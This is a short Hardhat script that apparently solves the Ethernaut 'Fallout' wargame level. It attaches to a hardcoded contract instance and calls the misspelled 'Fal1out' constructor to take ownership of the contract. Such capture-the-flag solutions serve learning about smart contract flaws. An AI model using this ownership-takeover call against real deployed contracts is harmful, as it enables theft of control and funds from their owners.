const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Fallout = await ethers.getContractFactory("Fallout");

    let contract = Fallout.attach(instance_address);

    // Call the Fal1out (mispelled constructor) function
    console.log('Calling the Fal1out method');
    await contract.Fal1out().then((txObj) => {
      console.log('txHash', txObj.hash)
    });

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x02980733Aa5C67c1f3aE4cB50A1D9d460f808458';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
